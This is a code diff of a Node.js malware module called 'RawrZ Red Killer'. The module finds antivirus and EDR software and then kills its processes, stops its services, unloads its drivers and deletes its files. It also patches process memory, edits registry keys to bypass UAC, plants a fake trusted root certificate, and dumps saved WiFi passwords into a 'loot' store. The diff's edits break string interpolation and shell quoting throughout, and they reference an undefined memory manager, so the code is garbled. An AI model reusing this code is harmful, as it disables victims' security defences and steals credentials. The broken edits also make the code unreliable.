@@ -7,14 +7,27 @@ const https = require('https');
 const tls = require('tls');
 
 class RedKiller {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor() {
         this.name = 'RawrZ Red Killer';
         this.version = '1.0.30';
         this.initialized = false;
-        this.activeKills = new Map();
-        this.extractedData = new Map();
-        this.lootContainer = new Map();
-        this.wifiCredentials = new Map();
+        this.activeKills = this.memoryManager.createManagedCollection('activeKills', 'Map', 100);
+        this.extractedData = this.memoryManager.createManagedCollection('extractedData', 'Map', 100);
+        this.lootContainer = this.memoryManager.createManagedCollection('lootContainer', 'Map', 100);
+        this.wifiCredentials = this.memoryManager.createManagedCollection('wifiCredentials', 'Map', 100);
         
         // AV/EDR Detection Patterns
         this.avPatterns = {
@@ -204,7 +217,7 @@ class RedKiller {
 
     async initialize() {
         try {
-            console.log(`[Red Killer] Initializing ${this.name} v${this.version}...`);
+            console.log("[Red Killer] Initializing ${this.name} v" + this.version + "...");
             
             // Initialize detection capabilities
             await this.initializeDetection();
@@ -222,7 +235,7 @@ class RedKiller {
             await this.initializeWiFiDumper();
             
             this.initialized = true;
-            console.log(`[Red Killer] ${this.name} v${this.version} initialized successfully`);
+            console.log("[Red Killer] ${this.name} v" + this.version + " initialized successfully");
             return true;
         } catch (error) {
             console.error(`[Red Killer] Initialization failed:`, error);
@@ -329,7 +342,7 @@ class RedKiller {
                 }
             }
 
-            console.log(`[Red Killer] Detection complete: ${detected.antivirus.length} AV, ${detected.edr.length} EDR, ${detected.systemSecurity.length} System Security, ${detected.malwareRemoval.length} Malware Removal, ${detected.analysisTools.length} Analysis Tools`);
+            console.log("[Red Killer] Detection complete: ${detected.antivirus.length} AV, ${detected.edr.length} EDR, ${detected.systemSecurity.length} System Security, ${detected.malwareRemoval.length} Malware Removal, " + detected.analysisTools.length + " Analysis Tools");
             return detected;
 
         } catch (error) {
@@ -467,7 +480,7 @@ class RedKiller {
                 }
             }
 
-            console.log(`[Red Killer] Termination complete: ${results.totalSuccessful}/${results.totalAttempted} successful`);
+            console.log("[Red Killer] Termination complete: ${results.totalSuccessful}/" + results.totalAttempted + " successful");
             return results;
 
         } catch (error) {
@@ -530,17 +543,17 @@ class RedKiller {
             for (const process of system.processes) {
                 if (process.platform === 'win32') {
                     // Use PowerShell for more reliable process termination
-                    const psCommand = `Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue`;
-                    exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
+                    const psCommand = "Get-Process -Id " + process.pid + " -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue";
+                    exec("powershell -Command `${psCommand}`", (error, stdout, stderr) => {
                         if (!error) {
                             result.success = true;
-                            result.details.push(`Killed process ${process.name} (PID: ${process.pid})`);
+                            result.details.push("Killed process ${process.name} (PID: " + process.pid + ")");
                         } else {
                             // Fallback to taskkill
                             exec(`taskkill /F /PID ${process.pid}`, (fallbackError, fallbackStdout, fallbackStderr) => {
                                 if (!fallbackError) {
                                     result.success = true;
-                                    result.details.push(`Killed process ${process.name} (PID: ${process.pid}) via taskkill`);
+                                    result.details.push("Killed process ${process.name} (PID: " + process.pid + ") via taskkill");
                                 }
                             });
                         }
@@ -550,13 +563,13 @@ class RedKiller {
                     exec(`kill -TERM ${process.pid}`, (error, stdout, stderr) => {
                         if (!error) {
                             result.success = true;
-                            result.details.push(`Terminated process ${process.name} (PID: ${process.pid})`);
+                            result.details.push("Terminated process ${process.name} (PID: " + process.pid + ")");
                         } else {
                             // Force kill if graceful termination fails
                             exec(`kill -KILL ${process.pid}`, (forceError, forceStdout, forceStderr) => {
                                 if (!forceError) {
                                     result.success = true;
-                                    result.details.push(`Force killed process ${process.name} (PID: ${process.pid})`);
+                                    result.details.push("Force killed process ${process.name} (PID: " + process.pid + ")");
                                 }
                             });
                         }
@@ -580,23 +593,23 @@ class RedKiller {
                     const serviceName = this.getServiceNameFromProcess(process.name);
                     if (serviceName) {
                         // Use PowerShell for more reliable service control
-                        const psCommand = `Stop-Service -Name "${serviceName}" -Force -ErrorAction SilentlyContinue`;
-                        exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
+                        const psCommand = "Stop-Service -Name `${serviceName}` -Force -ErrorAction SilentlyContinue";
+                        exec("powershell -Command `${psCommand}`", (error, stdout, stderr) => {
                             if (!error) {
                                 result.success = true;
                                 result.details.push(`Stopped service ${serviceName}`);
                             } else {
                                 // Fallback to net stop
-                                exec(`net stop "${serviceName}"`, (fallbackError, fallbackStdout, fallbackStderr) => {
+                                exec("net stop `${serviceName}`", (fallbackError, fallbackStdout, fallbackStderr) => {
                                     if (!fallbackError) {
                                         result.success = true;
-                                        result.details.push(`Stopped service ${serviceName} via net stop`);
+                                        result.details.push("Stopped service " + serviceName + " via net stop");
                                     } else {
                                         // Try sc command as last resort
-                                        exec(`sc stop "${serviceName}"`, (scError, scStdout, scStderr) => {
+                                        exec("sc stop `${serviceName}`", (scError, scStdout, scStderr) => {
                                             if (!scError) {
                                                 result.success = true;
-                                                result.details.push(`Stopped service ${serviceName} via sc`);
+                                                result.details.push("Stopped service " + serviceName + " via sc");
                                             }
                                         });
                                     }
@@ -616,10 +629,10 @@ class RedKiller {
                                 result.details.push(`Stopped service ${serviceName}`);
                             } else {
                                 // Try service command
-                                exec(`service ${serviceName} stop`, (serviceError, serviceStdout, serviceStderr) => {
+                                exec("service " + serviceName + " stop", (serviceError, serviceStdout, serviceStderr) => {
                                     if (!serviceError) {
                                         result.success = true;
-                                        result.details.push(`Stopped service ${serviceName} via service command`);
+                                        result.details.push("Stopped service " + serviceName + " via service command");
                                     }
                                 });
                             }
@@ -703,7 +716,7 @@ class RedKiller {
                     try {
                         if (fs.statSync(targetPath).isDirectory()) {
                             // Delete directory
-                            exec(`rmdir /s /q "${targetPath}"`, (error, stdout, stderr) => {
+                            exec("rmdir /s /q `${targetPath}`", (error, stdout, stderr) => {
                                 if (!error) {
                                     result.success = true;
                                     result.details.push(`Deleted directory: ${targetPath}`);
@@ -711,7 +724,7 @@ class RedKiller {
                             });
                         } else {
                             // Delete file
-                            exec(`del /f /q "${targetPath}"`, (error, stdout, stderr) => {
+                            exec("del /f /q `${targetPath}`", (error, stdout, stderr) => {
                                 if (!error) {
                                     result.success = true;
                                     result.details.push(`Deleted file: ${targetPath}`);
@@ -719,7 +732,7 @@ class RedKiller {
                             });
                         }
                     } catch (deleteError) {
-                        result.details.push(`Failed to delete ${targetPath}: ${deleteError.message}`);
+                        result.details.push(`Failed to delete ${targetPath}: deleteError.message`);
                     }
                 }
             }
@@ -785,13 +798,13 @@ class RedKiller {
                 
                 for (const driverName of driverNames) {
                     // Try to unload driver using sc command
-                    exec(`sc stop "${driverName}"`, (error, stdout, stderr) => {
+                    exec("sc stop `${driverName}`", (error, stdout, stderr) => {
                         if (!error) {
                             result.success = true;
                             result.details.push(`Stopped driver: ${driverName}`);
                         } else {
                             // Try to delete driver service
-                            exec(`sc delete "${driverName}"`, (deleteError, deleteStdout, deleteStderr) => {
+                            exec("sc delete `${driverName}`", (deleteError, deleteStdout, deleteStderr) => {
                                 if (!deleteError) {
                                     result.success = true;
                                     result.details.push(`Deleted driver service: ${driverName}`);
@@ -804,7 +817,7 @@ class RedKiller {
                 // Try to unload specific AV/EDR drivers
                 const avDrivers = this.getAVDriverNames(system);
                 for (const driver of avDrivers) {
-                    exec(`sc stop "${driver}"`, (error, stdout, stderr) => {
+                    exec("sc stop `${driver}`", (error, stdout, stderr) => {
                         if (!error) {
                             result.success = true;
                             result.details.push(`Stopped AV driver: ${driver}`);
@@ -882,10 +895,10 @@ class RedKiller {
                     }
                 `;
                 
-                exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
+                exec("powershell -Command `${psCommand}`", (error, stdout, stderr) => {
                     if (!error) {
                         result.success = true;
-                        result.details.push(`Patched memory for process ${process.name} (PID: ${process.pid})`);
+                        result.details.push("Patched memory for process ${process.name} (PID: " + process.pid + ")");
                     }
                 });
             }
@@ -928,7 +941,7 @@ class RedKiller {
             ];
             
             for (const regKey of hookRegKeys) {
-                exec(`reg add "${regKey}" /v /t REG_DWORD /d 0 /f`, (error, stdout, stderr) => {
+                exec("reg add `${regKey}` /v /t REG_DWORD /d 0 /f", (error, stdout, stderr) => {
                     if (!error) {
                         result.success = true;
                         result.details.push(`Bypassed UAC hook: ${regKey}`);
@@ -950,7 +963,7 @@ class RedKiller {
             const certData = this.generateFakeCertificate();
             
             // Install certificate to Trusted Root Certification Authorities
-            const certCommand = `certlm.msc /s /c "Local Computer\\Trusted Root Certification Authorities\\Certificates" /a "${certData}"`;
+            const certCommand = `certlm.msc /s /c "Local Computer\\Trusted Root Certification Authorities\\Certificates" /a ${certData}`;
             exec(certCommand, (error, stdout, stderr) => {
                 if (!error) {
                     result.success = true;
@@ -963,7 +976,7 @@ class RedKiller {
                         Import-Certificate -FilePath "C:\\temp\\fake.cer" -CertStoreLocation "Cert:\\LocalMachine\\Root";
                         Remove-Item "C:\\temp\\fake.cer";
                     `;
-                    exec(`powershell -Command "${psCommand}"`, (psError, psStdout, psStderr) => {
+                    exec("powershell -Command `${psCommand}`", (psError, psStdout, psStderr) => {
                         if (!psError) {
                             result.success = true;
                             result.details.push('Installed fake certificate via PowerShell');
@@ -1340,7 +1353,7 @@ class RedKiller {
                         
                         // Get password for each profile
                         profiles.forEach(profile => {
-                            exec(`netsh wlan show profile "${profile}" key=clear`, (error, stdout, stderr) => {
+                            exec("netsh wlan show profile `${profile}` key=clear", (error, stdout, stderr) => {
                                 if (!error) {
                                     const password = this.extractWiFiPassword(stdout);
                                     wifiCredentials.push({
@@ -1478,7 +1491,7 @@ class RedKiller {
         try {
             const lootDir = path.join(__dirname, '../../loot', lootId);
             if (!fs.existsSync(lootDir)) {
-                throw new Error(`Loot item ${lootId} not found`);
+                throw new Error("Loot item " + lootId + " not found");
             }
 
             const metadataPath = path.join(lootDir, 'metadata.json');
